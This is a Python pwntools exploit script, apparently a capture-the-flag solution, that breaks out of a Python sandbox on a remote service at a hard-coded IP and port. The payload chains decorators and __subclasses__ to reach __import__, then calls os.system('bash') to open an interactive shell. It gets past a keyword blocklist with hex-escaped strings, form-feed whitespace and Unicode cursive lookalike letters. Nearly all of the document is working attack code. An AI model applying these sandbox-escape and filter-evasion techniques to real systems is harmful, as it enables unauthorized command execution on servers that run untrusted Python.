from pwn import remote, process, args
import sys
import re

BINARY = "./app.py"

def convert_to_cursive(text):
    cursive_map = {
        'a': '𝓪', 'b': '𝓫', 'c': '𝓬', 'd': '𝓭', 'e': '𝓮',
        'f': '𝓯', 'g': '𝓰', 'h': '𝓱', 'i': '𝓲', 'j': '𝓳',
        'k': '𝓴', 'l': '𝓵', 'm': '𝓶', 'n': '𝓷', 'o': '𝓸',
        'p': '𝓹', 'q': '𝓺', 'r': '𝓻', 's': '𝓼', 't': '𝓽',
        'u': '𝓾', 'v': '𝓿', 'w': '𝔀', 'x': '𝔁', 'y': '𝔂',
        'z': '𝔃', 'A': '𝓐', 'B': '𝓑', 'C': '𝓒', 'D': '𝓓',
        'E': '𝓔', 'F': '𝓕', 'G': '𝓖', 'H': '𝓗', 'I': '𝓘',
        'J': '𝓙', 'K': '𝓚', 'L': '𝓛', 'M': '𝓜', 'N': '𝓝',
        'O': '𝓞', 'P': '𝓟', 'Q': '𝓠', 'R': '𝓡', 'S': '𝓢',
        'T': '𝓣', 'U': '𝓤', 'V': '𝓥', 'W': '𝓦', 'X': '𝓧',
        'Y': '𝓨', 'Z': '𝓩',
    }

    cursive_text = ''
    for char in text:
        if char in cursive_map:
            cursive_text += cursive_map[char]
        else:
            cursive_text += char

    return cursive_text


def convert_string_to_hex(string):
    def repl_func(match):
        substr = match.group(0)[1:-1]  # Remove the surrounding quotes
        hex_str = ''.join([f'\\x{ord(char):02x}' for char in substr])
        return f'"{hex_str}"' if match.group(0)[0] == '"' else f"'{hex_str}'"

    pattern = r'(["\'])(.*?)\1'
    converted_string = re.sub(pattern, repl_func, string)
    return converted_string

def newline_2_0c(string: str):
    return string.replace("\n", "\r").replace(" ", "\x0c")

def double_underscore_special(string: str):
    return string.replace("__", "_＿")

def init():
    #if args.RMT:
    p = remote("172.188.90.64", "25776")
#    else:
#        p = process(BINARY)
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p


x, p = init()
payload = r"""
command = lambda x: "bash"
import_list = []
os_list = []
x=__build_class__=lambda *_:_
g=x.__globals__
b=__builtins__
c=__builtins__
b|=g
type_class = lambda x: [].__class__.__class__
get_import = lambda x: x[0].register.__globals__["__builtins__"]["__import__"]
os_str = lambda x: "os"
@import_list.append
@get_import
@[].__class__.__class__.__subclasses__
@type_class
class X:...
@os_list.append
@import_list[0]
@os_str
class X:...
@os_list[0].system
@command
class X:...
""".strip()

to_convert = [
    "globals", "system", "import", "builtins", "sub", "eval", "exec", "compile",
    "locals", "vars", "open", "file", "input", "subprocess", "os", "sys", "shutil",
    "popen", "system", "commands", "ctypes", "f_locals", "frame", "traceback", "dir",
    "getattr", "setattr", "delattr", "code", "marshal", "base64", "pickle", "chr",
    "ord", "format", "replace", "re", "sre_", "search", "match", "findall", "finditer",
    "compile", "escape", "purge", "findall", "finditer", "sub", "subn", "split",
    "findall", "finditer", "purge", "template", "Scanner", "Pattern"
]

payload = convert_string_to_hex(payload)
payload = newline_2_0c(payload)
payload = double_underscore_special(payload)
for x in to_convert:
    payload = payload.replace(x, convert_to_cursive(x))

payload = payload.encode()
print(payload)
p.sendline(payload)
p.interactive()
